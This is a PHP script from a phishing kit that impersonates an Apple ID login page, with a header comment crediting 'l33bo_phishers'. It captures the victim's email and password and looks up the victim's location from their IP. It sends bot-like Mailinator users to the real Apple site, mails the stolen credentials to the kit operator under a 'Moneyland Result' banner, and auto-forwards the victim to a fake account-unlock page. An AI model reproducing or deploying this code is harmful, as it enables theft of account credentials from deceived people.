<?
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "session_protect.php";
require "functions.php";
date_default_timezone_set('Asia/Jakarta');
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}
$v_date = date("l d F H:i:s");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];$GLOBALS_LOCATION=$GLOBAL.'l';
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$negara = $details->geoplugin_countryCode;
$nama_negara = $details->geoplugin_countryName;
$kode_negara = strtolower($negara);
$kota        = $details->geoplugin_city;
$state        = $details->geoplugin_region;
$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass'];

if (inStr($_SESSION['user'],"mailinator")) {
    $msg = "
<font color='red'>Blocked Login (Mailinator Bot) |  IP : ".$ip." - Date : ".$v_date." - Browser : ".$user_agent." - Host : ".gethostbyaddr($ip)." - Country : ".$nama_negara." <br></font>";
$file=fopen("../logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
}
$msg = "
<font color='green'>Login From |  IP : ".$ip." - Date : ".$v_date." - Browser : ".$user_agent." - Host : ".gethostbyaddr($ip)." - Country : ".$nama_negara."<br></font>";
$file=fopen("../logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);

$message   = "
++-----[ $$ [Moneyland Result]  $$ ]-----++

	  .++====[ Apple Login ]====++.
Email	 		:  ".$_SESSION['user']."
Password  		:  ".$_SESSION['pass']."
	  .++======[ End ]======++.

	  .++====[ PC Info ]====++.
IP Info   		:  ".$nama_negara." - " . $state . " - " . $kota . " - " . $ip . " ]
Browser   		:  ".$_SERVER['HTTP_USER_AGENT']."
	  .++======[ End ]======++.

++-----[ $$ Moneyland Result $$ ]-----++
";
//+++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++\\\

include '../../CONTROLS.php';
$subject = "Login [ ".$nama_negara." - " . $state . " - " . $kota . " - " . $ip . " ]";
$headers = "From: Apple Login <result@moneyland.login>";
mail($Your_Email, $subject, $message, $headers);
?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>